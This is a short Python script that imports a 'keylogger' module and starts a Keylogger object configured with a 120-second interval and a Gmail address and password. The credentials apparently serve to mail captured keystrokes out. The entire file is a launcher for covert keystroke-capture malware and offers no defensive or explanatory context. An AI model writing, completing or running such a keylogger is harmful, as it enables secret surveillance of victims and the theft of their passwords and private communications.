#!/usr/bin/python

import keylogger

my_keylogger = keylogger.Keylogger(120, "mail@gmail.com", "password")
my_keylogger.start()